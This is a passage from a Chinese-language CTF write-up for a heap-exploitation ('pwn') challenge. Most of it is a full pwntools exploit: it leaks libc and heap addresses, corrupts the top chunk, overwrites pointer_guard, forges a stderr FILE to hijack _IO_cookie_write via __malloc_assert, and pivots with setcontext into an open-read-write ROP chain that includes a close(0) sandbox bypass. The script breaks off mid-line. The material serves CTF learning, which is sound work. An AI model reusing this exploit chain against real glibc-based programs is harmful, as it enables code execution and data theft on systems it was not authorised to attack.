fs[0x30]以被我们修改，也可以看到__pointer_chk_guard_local没有改变
> 290-chunk2 - edit(stderr)
>
> 6c0-chunk1
>
> af0-chunk15 - edit(pointer_guard)
>
> f40-chunk14
>
> 390-chunk3 - stderr(fake_file)
>
> 7b0-chunk13 orw
>
> bf0-chunk12 - pointer_guard
>
> 030-chunk11
‍
###### 修改topchunk大小
​​  
​​
    add(8,0x450,b'ggg') #d50
    delete(9)
    delete(10)
    delete(8)
​  
​
    add(7,0x460,b'a'*0x458 + p64(0x471))
    add(6,0x460,b'a'*0x458 + p64(0x451))
​  
​
‍
    delete(6)
    delete(9)
​  
​
​  
​
    add(4, 0x460, p64(0) + p64(0x100))
可以看到top_chunk的size已被我们修改  
​  
​
    sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
    sla('plz input your cat choice:\n',str(1))
    sla('plz input your cat idx:\n',str(5))
    sla('plz input your cat size:\n',str(0x460))
‍
###### 触发 **IO调用**
**__malloc_assert**
**fflush**
**_IO_cookie_write**
**getkeyserv_handle+576**
**orw**  
‍
    chunk13=heap_base+0x10d0+0x460
    orw = p64(0) + p64(heap_base+0x10d0+0x460)
    orw += b'\x00' * 0x10
    orw += p64(setcontext+61)
    orw += b'\x00' * 0x78
    orw += p64(heap_base + 0x10e0 + 0x460+0xa0) + p64(ret)
    orw += p64(pop_rdi_ret) + p64(0)
    orw += p64(close)
    orw += p64(pop_rdi_ret) + p64(flag_path)
    orw += p64(pop_rsi_ret) + p64(0)
    orw += p64(pop_rax_ret) + p64(2)
    orw += p64(syscall)
    orw += p64(pop_rdi_ret) + p64(0)
    orw += p64(pop_rsi_ret) + p64(flag_path)
    orw += p64(pop_rdx_ret) + p64(0x41)*2
    orw += p64(Read)
    orw += p64(pop_rdi_ret) + p64(1)
    orw += p64(Write)
​  
​
‍
    orw += p64(pop_rdi_ret) + p64(0)
    orw += p64(close)
这里的close(0)解释一下，首先我们可以看到沙箱这里调用read的话会查看fd是否为0，非0则直接KILL
​  
​
如果我们要将调用flag来读入到内存则一定要使fd为0，但0、1、2（标准输入、输出、错误）均被占用时，我们如果read
flag，那么flag文件描述符则为3，程序会截止
而我们首先构造close(0)，将标准输入关闭掉，再次read的时候flag文件描述符就将是0，则可以正常read
‍
###### exp:
    from pwn import *
    p=process('./pwn')
    libc=ELF('./libc.so.6')
    context.log_level='debug'
    s       = lambda data               :p.send(data)
    sa      = lambda x, y               :p.sendafter(x, y)
    sl      = lambda data               :p.sendline(data)
    sla     = lambda x, y               :p.sendlineafter(x, y)
    r       = lambda num                :p.recv(num)
    ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
    itr     = lambda                    :p.interactive()
    uu32    = lambda data,num           :u32(p.recvuntil(data)[-num:].ljust(4,b'\x00'))
    uu64    = lambda data,num           :u64(p.recvuntil(data)[-num:].ljust(8,b'\x00'))
    leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))
    l64     = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
    l32     = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
    li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
    ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
    context.terminal = ['gnome-terminal','-x','sh','-c']
    def dbg():
       gdb.attach(proc.pidof(p)[0])
       pause()
    def add(idx,size,cont):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n',str(1))
        sla('plz input your cat idx:\n',str(idx))
        sla('plz input your cat size:\n',str(size))
        sa('plz input your content:\n',cont)
    def delete(idx):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(2))
        sla('plz input your cat idx:\n',str(idx))
    def show(idx):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(3))
        sla('plz input your cat idx:\n',str(idx))
    def edit(idx,cont):
        sa('mew mew mew~~~~~~', 'CAT | r00t QWB QWXF$\xff')
        sla('plz input your cat choice:\n', str(4))
        sla('plz input your cat idx:\n',str(idx))
        sa('plz input your content:\n', cont)
    sa('mew mew mew~~~~~~','LOGIN | r00t QWB QWXFadmin')
    add(0,0x428,b'aaa')
    add(1,0x428,b'./flag\x00')
    delete(0)
    add(15,0x448,b'./flag\x00')
    add(14,0x448,b'./flag\x00')
    show(0)
    libc_base=l64()-0x21a0d0
    li('libc_base = '+hex(libc_base))
    heap_base=u64(p.recvuntil("\x55")[-6:].ljust(8,b"\x00"))#-0x290
    li('heap_addr = '+hex(heap_base))
    pop_rdi_ret = libc_base + 0x000000000002a3e5
    pop_rsi_ret = libc_base + 0x000000000002be51
    pop_rdx_ret = libc_base + 0x000000000011f497
    pop_rax_ret = libc_base + 0x0000000000045eb0
    ret = libc_base + 0x0000000000029cd6
    Read = libc_base + libc.sym['read']
    Write = libc_base + libc.sym['write']
    close = libc_base + libc.sym['close']
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + 0x00000000001d8698
    syscall = Read + 0x10
    #print('================================
    flag_path = heap_base + 0x440
    rtld_global = libc_base + 0x275040 #0x278040
    stderr = libc_base + libc.sym['stderr']
    setcontext = libc_base + libc.sym['setcontext']
    #mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
    gadget = libc_base + 0x00000000001675b0 
    io_cookie_jumps_addr = libc_base + 0x215b80
    pointer_guard = libc_base - 0x2890
    _IO_stdfile_2_lock=libc_base+0x21ba60
    #print('================================
    fake_file = b'0' * 0x78
    fake_file += p64(libc_base+0x21ba60)
    fake_file = fake_file.ljust(0xc8, b'\x00')
    fake_file += p64(io_cookie_jumps_addr+0x18)
    fake_file += p64(heap_base + 0x10e0 + 0x450)
    fake_file += p64(0)
    enc_data =((gadget^(heap_base+0x1960))>>(64-0x11))|((gadget^(heap_base+0x1960))  
‍
‍